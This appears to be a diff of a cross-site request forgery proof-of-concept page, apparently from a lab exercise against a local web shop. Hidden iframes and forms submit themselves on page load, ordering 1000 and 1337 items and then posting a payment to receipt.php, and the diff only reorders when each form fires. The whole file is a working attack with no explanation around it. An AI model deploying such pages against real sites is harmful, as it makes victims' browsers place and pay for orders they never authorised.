@@ -6,18 +6,21 @@
 	<iframe style="display:none" name="csrfItem1"></iframe>
 	<iframe style="display:none" name="csrfItem2"></iframe>
 	<iframe style="display:none" name="csrfPay"></iframe>
-		<form id="item1-form" name="itemorder" method="post" action="https://127.0.0.1/index.php" target="csrfItem1">
+	
+		<form id="item1-form" method="post" action="https://127.0.0.1/index.php" target="csrfItem1">
 			<input type=hidden name=nbrOfItems value=1000>
 			<input type=hidden name=itemid value=2>
 		</form>
-		<form id="item2-form" name="itemorder" method="post" action="https://127.0.0.1/index.php" target="csrfItem2">
+
+		<script>document.getElementById("item1-form").submit()</script>
+		<form id="item2-form" method="post" action="https://127.0.0.1/index.php" target="csrfItem2">
 			<input type=hidden name=nbrOfItems value=1337>
 			<input type=hidden name=itemid value=1>
 		</form>
+
+		<script>document.getElementById("item2-form").submit()</script>
 		<form id="pay-form" name="payment" method="post" action="https://127.0.0.1/receipt.php" target="csrfPay">
 		</form>
-		<script>document.getElementById("item1-form").submit()</script>
-		<script>document.getElementById("item2-form").submit()</script>
 		<script>document.getElementById("pay-form").submit()</script>
 </body>
 </html>
